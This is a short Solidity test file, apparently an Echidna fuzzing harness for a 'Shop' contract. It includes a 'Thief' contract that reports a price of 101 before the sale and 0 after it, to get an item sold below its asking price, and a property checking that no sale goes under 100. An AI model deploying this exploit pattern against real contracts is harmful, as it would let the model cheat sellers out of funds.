pragma solidity ^0.5.0;

import 'contract.sol';

contract Thief {
  function price() external returns (uint) {
    return Test(msg.sender).isSold() ? 0 : 101;
  }

  function try_buy() public { Test(0x1337).buy(); }
}

contract Test is Shop {
  constructor() public {
    // echidna hinting
    new Thief();
  }

  function echidna_test_purchase() public returns (bool) {
    return !isSold || price >= 100;
  }
}
